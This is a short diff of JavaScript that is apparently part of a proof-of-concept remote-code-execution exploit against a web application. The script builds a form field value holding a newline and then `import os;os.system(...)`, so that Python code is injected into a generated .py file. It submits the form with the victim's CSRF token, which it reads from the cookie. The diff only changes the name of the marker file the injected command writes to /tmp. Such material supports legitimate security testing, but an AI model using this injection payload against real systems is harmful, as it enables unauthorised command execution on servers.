@@ -4,7 +4,7 @@
      const slug = 'rce-' + id;
 
      // The payload: using \n explicitly to break the comment line in the .py file
-     const name = `Exploit${id}\nimport os;os.system("id > /tmp/rce.txt")`;
+     const name = `Exploit${id}\nimport os;os.system("id > /tmp/rce-anurag.txt")`;
 
      const formData = new FormData();
      formData.append('csrfmiddlewaretoken', getCookie('csrftoken'));
